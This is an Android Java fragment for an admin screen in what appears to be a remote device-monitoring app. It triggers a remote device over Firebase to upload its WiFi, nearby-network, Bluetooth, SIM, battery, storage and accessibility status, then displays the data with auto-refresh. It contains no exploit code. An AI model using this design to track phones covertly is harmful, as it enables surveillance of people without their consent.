package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.content.Context;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import com.google.firebase.database.ValueEventListener;

import java.lang.ref.WeakReference;
import java.lang.reflect.Type;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class AdminDeviceInfoFragment extends Fragment {

    private static WeakReference<AdminDeviceInfoFragment> activeInstance;

    private static final int AUTO_REFRESH_SECS = 30;
    private static final int COLOR_ON   = 0xFF4CAF50;
    private static final int COLOR_OFF  = 0xFFE53935;
    private static final int COLOR_WARN = 0xFFFF9800;

    private final SimpleDateFormat dtFormat =
            new SimpleDateFormat("MMM dd  HH:mm:ss", Locale.getDefault());

    // Header
    private View loader;
    private TextView lastUpdateView, countdownBadge;

    // WiFi
    private TextView wifiBadge, wifiSsid, wifiIp, wifiSignal, wifiSpeed, wifiBand;
    private LinearLayout wifiNearbyContainer;

    // Bluetooth
    private TextView btBadge, btName;
    private LinearLayout btDevicesContainer;

    // Network
    private TextView netBadge, netOperator, netType, netRoaming, netMobileData;
    private LinearLayout simContainer;

    // Battery
    private TextView batteryPctBadge, batterySummary, usbStatus, chargingType, batteryHealth, batteryTemp;

    // Storage
    private TextView storageSummary, storageIntLabel, storageExtLabel;
    private ProgressBar storageIntBar, storageExtBar;
    private View storageExtSection;

    // System
    private TextView sysModel, sysAndroid, sysSdk, sysCpu, sysUptime, sysRamLabel, sysPatch, sysBuild, sysAccessibility;
    private ProgressBar sysRamBar;

    private ValueEventListener deviceInfoListener;

    // Auto-refresh
    private final Handler countdownHandler = new Handler(Looper.getMainLooper());
    private int secondsLeft = AUTO_REFRESH_SECS;

    private final Runnable countdownRunnable = new Runnable() {
        @Override
        public void run() {
            if (getView() == null) return;
            secondsLeft--;
            countdownBadge.setText(secondsLeft + "s");
            if (secondsLeft <= 0) {
                secondsLeft = AUTO_REFRESH_SECS;
                fetchData();
            }
            countdownHandler.postDelayed(this, 1000);
        }
    };

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activeInstance = new WeakReference<>(this);
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_device_info, container, false);

        loader             = view.findViewById(R.id.di_loader);
        lastUpdateView     = view.findViewById(R.id.di_last_update);
        countdownBadge     = view.findViewById(R.id.di_countdown_badge);

        wifiBadge          = view.findViewById(R.id.di_wifi_badge);
        wifiSsid           = view.findViewById(R.id.di_wifi_ssid);
        wifiIp             = view.findViewById(R.id.di_wifi_ip);
        wifiSignal         = view.findViewById(R.id.di_wifi_signal);
        wifiSpeed          = view.findViewById(R.id.di_wifi_speed);
        wifiBand           = view.findViewById(R.id.di_wifi_band);
        wifiNearbyContainer = view.findViewById(R.id.di_wifi_nearby_container);

        btBadge            = view.findViewById(R.id.di_bt_badge);
        btName             = view.findViewById(R.id.di_bt_name);
        btDevicesContainer = view.findViewById(R.id.di_bt_devices_container);

        netBadge           = view.findViewById(R.id.di_net_badge);
        netOperator        = view.findViewById(R.id.di_net_operator);
        netType            = view.findViewById(R.id.di_net_type);
        netRoaming         = view.findViewById(R.id.di_net_roaming);
        netMobileData      = view.findViewById(R.id.di_net_mobile_data);
        simContainer       = view.findViewById(R.id.di_sim_container);

        batteryPctBadge    = view.findViewById(R.id.di_battery_pct_badge);
        batterySummary     = view.findViewById(R.id.di_battery_summary);
        usbStatus          = view.findViewById(R.id.di_usb_status);
        chargingType       = view.findViewById(R.id.di_charging_type);
        batteryHealth      = view.findViewById(R.id.di_battery_health);
        batteryTemp        = view.findViewById(R.id.di_battery_temp);

        storageSummary     = view.findViewById(R.id.di_storage_summary);
        storageIntLabel    = view.findViewById(R.id.di_storage_int_label);
        storageIntBar      = view.findViewById(R.id.di_storage_int_bar);
        storageExtSection  = view.findViewById(R.id.di_storage_ext_section);
        storageExtLabel    = view.findViewById(R.id.di_storage_ext_label);
        storageExtBar      = view.findViewById(R.id.di_storage_ext_bar);

        sysModel           = view.findViewById(R.id.di_sys_model);
        sysAndroid         = view.findViewById(R.id.di_sys_android);
        sysSdk             = view.findViewById(R.id.di_sys_sdk);
        sysCpu             = view.findViewById(R.id.di_sys_cpu);
        sysUptime          = view.findViewById(R.id.di_sys_uptime);
        sysRamLabel        = view.findViewById(R.id.di_sys_ram_label);
        sysRamBar          = view.findViewById(R.id.di_sys_ram_bar);
        sysPatch           = view.findViewById(R.id.di_sys_patch);
        sysBuild           = view.findViewById(R.id.di_sys_build);
        sysAccessibility   = view.findViewById(R.id.di_sys_accessibility);

        view.findViewById(R.id.di_back_btn).setOnClickListener(v ->
                getParentFragmentManager().popBackStack());

        view.findViewById(R.id.di_refresh_btn).setOnClickListener(v -> {
            secondsLeft = AUTO_REFRESH_SECS;
            countdownBadge.setText(secondsLeft + "s");
            fetchData();
        });

        // Toggle buttons removed as per user request to move them to ClickActions or remove them.
        
        fetchData();
        countdownHandler.postDelayed(countdownRunnable, 1000);
        return view;
    }

    private void fetchData() {
        if (loader != null) loader.setVisibility(View.VISIBLE);
        // Tell the remote device to collect and upload fresh data
        FirebaseUtils.triggerDeviceInfoCapture();
        // Attach real-time listener once; it auto-updates whenever remote device responds
        if (deviceInfoListener == null) {
            deviceInfoListener = FirebaseUtils.listenDeviceInfo();
        }
    }

    // ── Static callback from FirebaseUtils ───────────────────────────────────

    public static void displayDeviceInfo(Activity activity, Object rawData) {
        if (activeInstance == null || activeInstance.get() == null) return;
        AdminDeviceInfoFragment f = activeInstance.get();
        if (f.getView() == null) return;

        Gson gson = new Gson();
        Type type = new TypeToken<Map<String, Object>>() {}.getType();
        Map<String, Object> root = gson.fromJson(gson.toJson(rawData), type);

        f.populateUI(root);
    }

    // ── UI population ────────────────────────────────────────────────────────

    private void populateUI(Map<String, Object> root) {
        if (root == null) {
            if (loader != null) loader.setVisibility(View.GONE);
            return;
        }
        if (loader != null) loader.setVisibility(View.GONE);

        long capturedAt = getLong(root, "capturedAt");
        lastUpdateView.setText(capturedAt > 0
                ? "Device capture: " + dtFormat.format(new Date(capturedAt)) : "—");

        populateWifi(getMap(root, "wifi"));
        populateBluetooth(getMap(root, "bluetooth"));
        populateNetwork(getMap(root, "network"));
        populateBattery(getMap(root, "battery"));
        populateStorage(getMap(root, "storage"));
        populateSystem(getMap(root, "system"));
    }

    private void populateWifi(@Nullable Map<String, Object> wifi) {
        if (wifi == null) return;
        boolean wifiEnabled = getBool(wifi, "enabled");
        setBadge(wifiBadge, wifiEnabled ? "ON" : "OFF", wifiEnabled ? COLOR_ON : COLOR_OFF);
        wifiSsid.setText(getString(wifi, "ssid", "Not connected"));
        wifiIp.setText(getString(wifi, "ipAddress", "—"));
        int rssi = (int) getLong(wifi, "rssi");
        int bars = (int) getLong(wifi, "signalBars");
        wifiSignal.setText(rssi != 0 ? rssi + " dBm (" + "▂▄▆█".substring(0, Math.min(bars, 4)) + ")" : "—");
        long spd = getLong(wifi, "linkSpeedMbps");
        wifiSpeed.setText(spd > 0 ? spd + " Mbps" : "—");
        wifiBand.setText(getString(wifi, "band", "—"));

        // Nearby networks
        wifiNearbyContainer.removeAllViews();
        String scanError  = getString(wifi, "scanError", "");
        long   scanCount  = getLong(wifi, "scanResultCount");
        boolean locPerm    = getBool(wifi, "locationPermission");
        boolean locEnabled = getBool(wifi, "locationEnabled");

        List<Map<String, Object>> nearby = getList(wifi, "nearbyNetworks");
        if (!scanError.isEmpty()) {
            addRow(wifiNearbyContainer, "! " + scanError, null);
        } else if (nearby.isEmpty()) {
            String reason = !locPerm    ? "Location permission not granted"
                          : !locEnabled ? "Location services disabled on device"
                          : scanCount == 0 ? "Scan returned 0 results (throttled?)"
                          : "No networks found";
            addRow(wifiNearbyContainer, reason, null);
        } else {
            for (Map<String, Object> net : nearby) {
                String ssid  = getString(net, "ssid", "(hidden)");
                int    lvl   = (int) getLong(net, "level");
                String band  = getString(net, "band", "");
                boolean isConn = getBool(net, "connected");
                addRow(wifiNearbyContainer,
                        (isConn ? "> " : "") + ssid,
                        lvl + " dBm  " + band + (isConn ? "  [active]" : ""));
            }
        }
    }

    private void populateBluetooth(@Nullable Map<String, Object> bt) {
        if (bt == null) return;
        boolean avail = getBool(bt, "available");
        boolean btEnabled = avail && getBool(bt, "enabled");
        setBadge(btBadge, btEnabled ? "ON" : (avail ? "OFF" : "N/A"), btEnabled ? COLOR_ON : COLOR_OFF);
        btName.setText(getString(bt, "name", "—"));

        btDevicesContainer.removeAllViews();
        List<Map<String, Object>> devices = getList(bt, "pairedDevices");
        if (devices.isEmpty()) {
            addRow(btDevicesContainer, "No paired devices", null);
        } else {
            for (Map<String, Object> dev : devices) {
                boolean connected = getBool(dev, "connected");
                addRow(btDevicesContainer,
                        getString(dev, "name", "Unknown"),
                        getString(dev, "type", "") + "  " + (connected ? "[connected]" : "[paired]"));
            }
        }
    }

    private void populateNetwork(@Nullable Map<String, Object> net) {
        if (net == null) return;
        boolean connected = getBool(net, "connected");
        boolean mobileData = getBool(net, "mobileDataEnabled");
        boolean roaming = getBool(net, "roaming");
        String connType = getString(net, "connectionType", "None");
        String operator = getString(net, "networkOperator", "—");
        String netTypeStr = getString(net, "networkType", "—");

        setBadge(netBadge, connected ? connType.toUpperCase() : "OFFLINE",
                connected ? COLOR_ON : COLOR_OFF);
        netOperator.setText(operator);
        netType.setText(netTypeStr);
        netRoaming.setText(roaming ? "Yes" : "No");
        netMobileData.setText(mobileData ? "On" : "Off");

        simContainer.removeAllViews();
        List<Map<String, Object>> sims = getList(net, "sims");
        if (sims.isEmpty()) {
            addRow(simContainer, "No SIM info", null);
        } else {
            for (Map<String, Object> sim : sims) {
                long slot = getLong(sim, "slot");
                String carrier = getString(sim, "carrier", "—");
                String country = getString(sim, "country", "");
                String netType = getString(sim, "networkType", "");
                long sigLevel = getLong(sim, "signalLevel");
                String sigBars = sigLevel > 0 ? signalBars((int) sigLevel) : "";
                String detail = netType.isEmpty() ? country : netType + "  " + country;
                if (!sigBars.isEmpty()) detail += "  " + sigBars;
                addRow(simContainer, "SIM " + slot + "  " + carrier, detail);
            }
        }
    }

    private void populateBattery(@Nullable Map<String, Object> bat) {
        if (bat == null) return;
        long pct = getLong(bat, "percent");
        boolean usb = getBool(bat, "usbConnected");
        boolean charging = getBool(bat, "charging");
        String status = getString(bat, "status", "—");
        String health = getString(bat, "health", "—");
        String chargeType = getString(bat, "chargingType", "None");
        float temp = (float) getDouble(bat, "tempC");

        int pctColor = pct > 50 ? COLOR_ON : pct > 20 ? COLOR_WARN : COLOR_OFF;
        setBadge(batteryPctBadge, pct + "%", pctColor);
        batterySummary.setText(status + (charging ? "  ·  " + chargeType : ""));
        usbStatus.setText(usb ? "Connected" : "Disconnected");
        chargingType.setText(chargeType);
        batteryHealth.setText(health);
        batteryTemp.setText(temp + " °C");
    }

    private void populateStorage(@Nullable Map<String, Object> storage) {
        if (storage == null) return;
        long intTotal = getLong(storage, "internalTotalBytes");
        long intFree  = getLong(storage, "internalFreeBytes");
        String intUsedFmt  = getString(storage, "internalUsedFormatted", "—");
        String intTotalFmt = getString(storage, "internalTotalFormatted", "—");
        storageSummary.setText(intUsedFmt + " / " + intTotalFmt);
        storageIntLabel.setText(intUsedFmt + " used  of  " + intTotalFmt);
        if (intTotal > 0) storageIntBar.setProgress((int) ((intTotal - intFree) * 100 / intTotal));

        boolean extAvail = getBool(storage, "externalAvailable");
        storageExtSection.setVisibility(extAvail ? View.VISIBLE : View.GONE);
        if (extAvail) {
            long extTotal = getLong(storage, "externalTotalBytes");
            long extFree  = getLong(storage, "externalFreeBytes");
            String extUsedFmt  = getString(storage, "externalTotalFormatted", "—");
            storageExtLabel.setText(getString(storage, "externalFreeFormatted", "—")
                    + " free  of  " + extUsedFmt);
            if (extTotal > 0) storageExtBar.setProgress((int) ((extTotal - extFree) * 100 / extTotal));
        }
    }

    private void populateSystem(@Nullable Map<String, Object> sys) {
        if (sys == null) return;
        String mfr   = getString(sys, "manufacturer", "");
        String model = getString(sys, "model", "—");
        sysModel.setText(mfr.isEmpty() ? model : mfr + " " + model);
        sysAndroid.setText("Android " + getString(sys, "androidVersion", "—")
                + "  ·  " + getString(sys, "brand", ""));
        sysSdk.setText("API " + getLong(sys, "sdkInt"));
        sysCpu.setText(getString(sys, "cpuAbi", "—"));
        sysUptime.setText(getString(sys, "uptimeHours", "—"));
        sysPatch.setText(getString(sys, "securityPatch", "—"));
        sysBuild.setText(getString(sys, "buildId", "—"));

        boolean accEnabled = getBool(sys, "accessibilityEnabled");
        setBadge(sysAccessibility, accEnabled ? "ACC: ON" : "ACC: OFF", accEnabled ? COLOR_ON : COLOR_OFF);

        long totalRam = getLong(sys, "totalRamBytes");
        long availRam = getLong(sys, "availRamBytes");
        String totalFmt = getString(sys, "totalRamFormatted", "—");
        String availFmt = getString(sys, "availRamFormatted", "—");
        sysRamLabel.setText(availFmt + " free  of  " + totalFmt);
        if (totalRam > 0) sysRamBar.setProgress((int) ((totalRam - availRam) * 100 / totalRam));
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private static String signalBars(int level) {
        String[] b = {"", "▂", "▂▄", "▂▄▆", "▂▄▆█"};
        return (level >= 0 && level < b.length) ? b[level] : "";
    }

    private void setBadge(TextView tv, String text, int color) {
        if (tv == null) return;
        tv.setText(text);
        GradientDrawable bg = new GradientDrawable();
        bg.setShape(GradientDrawable.RECTANGLE);
        bg.setCornerRadius(20f);
        bg.setColor(color);
        tv.setBackground(bg);
    }

    private void addRow(LinearLayout container, String label, @Nullable String value) {
        Context ctx = container.getContext();
        LinearLayout row = new LinearLayout(ctx);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        int marginDp = dp(4);
        rp.setMargins(0, marginDp, 0, marginDp);
        row.setLayoutParams(rp);
        row.setPadding(dp(4), dp(4), dp(4), dp(4));

        TextView labelTv = new TextView(ctx);
        labelTv.setText("•  " + label);
        labelTv.setTextColor(0xFFB39DDB);
        labelTv.setTextSize(12f);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0,
                LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        labelTv.setLayoutParams(lp);
        row.addView(labelTv);

        if (value != null && !value.isEmpty()) {
            TextView valueTv = new TextView(ctx);
            valueTv.setText(value);
            valueTv.setTextColor(0x99FFFFFF);
            valueTv.setTextSize(11f);
            row.addView(valueTv);
        }
        container.addView(row);
    }

    private int dp(int value) {
        Context ctx = getContext();
        if (ctx == null) return value;
        return Math.round(value * ctx.getResources().getDisplayMetrics().density);
    }

    @SuppressWarnings("unchecked")
    private static Map<String, Object> getMap(Map<String, Object> parent, String key) {
        if (parent == null) return null;
        Object v = parent.get(key);
        return v instanceof Map ? (Map<String, Object>) v : null;
    }

    @SuppressWarnings("unchecked")
    private static List<Map<String, Object>> getList(Map<String, Object> parent, String key) {
        if (parent == null) return Collections.emptyList();
        Object v = parent.get(key);
        if (v instanceof List) {
            List<?> raw = (List<?>) v;
            List<Map<String, Object>> result = new ArrayList<>();
            for (Object item : raw) {
                if (item instanceof Map) result.add((Map<String, Object>) item);
            }
            return result;
        }
        if (v instanceof Map) {
            Map<String, Object> m = (Map<String, Object>) v;
            List<Map<String, Object>> result = new ArrayList<>();
            for (Object item : m.values()) {
                if (item instanceof Map) result.add((Map<String, Object>) item);
            }
            return result;
        }
        return Collections.emptyList();
    }

    private static String getString(Map<String, Object> m, String key, String def) {
        if (m == null) return def;
        Object v = m.get(key);
        return (v != null && !String.valueOf(v).equals("null")) ? String.valueOf(v) : def;
    }

    private static boolean getBool(Map<String, Object> m, String key) {
        if (m == null) return false;
        Object v = m.get(key);
        if (v instanceof Boolean) return (Boolean) v;
        return "true".equalsIgnoreCase(String.valueOf(v));
    }

    private static long getLong(Map<String, Object> m, String key) {
        if (m == null) return 0;
        Object v = m.get(key);
        if (v instanceof Number) return ((Number) v).longValue();
        try { return Long.parseLong(String.valueOf(v)); } catch (Exception e) { return 0; }
    }

    private static double getDouble(Map<String, Object> m, String key) {
        if (m == null) return 0;
        Object v = m.get(key);
        if (v instanceof Number) return ((Number) v).doubleValue();
        try { return Double.parseDouble(String.valueOf(v)); } catch (Exception e) { return 0; }
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        countdownHandler.removeCallbacks(countdownRunnable);
        FirebaseUtils.stopListeningDeviceInfo(deviceInfoListener);
        deviceInfoListener = null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        activeInstance = null;
    }
}
